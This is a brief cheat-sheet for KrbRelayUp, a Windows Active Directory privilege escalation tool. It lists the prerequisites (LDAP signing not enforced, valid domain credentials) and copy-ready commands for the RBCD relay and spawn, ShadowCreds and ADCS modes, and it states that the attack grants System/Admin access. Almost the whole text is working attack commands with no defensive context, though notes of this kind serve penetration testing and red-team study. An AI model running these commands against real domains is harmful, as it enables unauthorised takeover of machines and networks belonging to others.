# KrbRelayUp

Link: https://github.com/Dec0ne/KrbRelayUp

## Requirements: LDAP Signing is not enforced. Valid domain user credentials.

### 1) RBCD

    ./KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName test$ -ComputerPassword Password123!
    ./KrbRelayUp.exe spawn -d domain.local -cn test$ -cp Password123!

### 2) ShadowCreds

    ./KrbRelayUp.exe full -m shadowcred --ForceShadowCred

### 3) ADCS

    ./KrbRelayUp.exe full -m adcs

# Example

    .\KrbRelayUp.exe relay -Domain DOMAIN -CreateNewComputerAccount -ComputerName COMPUTER$ -ComputerPassword PASSWORD

    .\KrbRelayUp.exe spawn -m rbcd -d DOMAIN -dc DC -cn COMPUTER_NAME -cp COMPUTER_PASS

## This attack grants System/Admin access
